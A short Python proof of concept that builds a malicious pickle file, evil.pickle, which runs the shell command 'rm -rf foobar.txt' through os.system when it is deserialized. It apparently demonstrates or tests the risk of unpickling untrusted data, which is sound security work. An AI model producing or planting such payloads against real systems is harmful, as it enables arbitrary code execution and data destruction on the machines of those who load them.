import os
import pickle


class EvilClass:
    def __reduce__(self):
        return (os.system, ("rm -rf foobar.txt",))


evil_obj = EvilClass()
serialized_data = pickle.dumps(evil_obj)

with open("evil.pickle", "wb") as file:
    file.write(serialized_data)
